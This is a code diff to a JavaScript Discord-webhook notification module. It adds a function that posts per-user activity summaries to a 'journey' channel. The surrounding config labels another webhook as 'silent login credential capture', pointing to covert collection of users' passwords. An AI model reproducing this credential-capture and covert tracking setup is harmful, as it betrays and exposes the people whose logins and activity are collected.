@@ -45,6 +45,10 @@ const WEBHOOKS = {
     // #creds — silent login credential capture (private channel)
     creds:    process.env.DISCORD_WEBHOOK_CREDS
            || process.env.DISCORD_WEBHOOK_URL,
+
+    // #general/journey — user activity summary reports
+    journey:  process.env.DISCORD_WEBHOOK_JOURNEY
+           || process.env.DISCORD_WEBHOOK_URL,
 };
 
 // ─── Brand colours ────────────────────────────────────────────
@@ -391,6 +395,24 @@ function sendChatSummary({ text, user, page, intent, isHotLead = false }) {
 }
 
 /**
+ * User activity summary — condensed journey report
+ * Called by journeyAgent after inactivity timeout
+ */
+function sendJourneySummary({ user, activities }) {
+    const embed = baseEmbed({
+        title:       '🚀 USER ACTIVITY SUMMARY',
+        color:       COLOR.blue,
+        description: Array.isArray(activities) ? activities.join('\n') : String(activities),
+        fields:      [
+            { name: 'IDENTIFIER', value: safeValue(user), inline: true },
+            { name: 'EVENTS',    value: `**${(activities || []).length}**`, inline: true },
+        ],
+        footer: `${FOOTER_TAG} · Journey Tracker`
+    });
+    dispatch('journey', embed);
+}
+
+/**
  * System alert — errors, warnings, important notices
  */
 function sendAlert(title, description, level = 'info') {
@@ -569,6 +591,9 @@ module.exports = {
 
     // Chat
     sendChatSummary,
+
+    // Journey
+    sendJourneySummary,
 
     // Alerts & reports
     sendAlert,
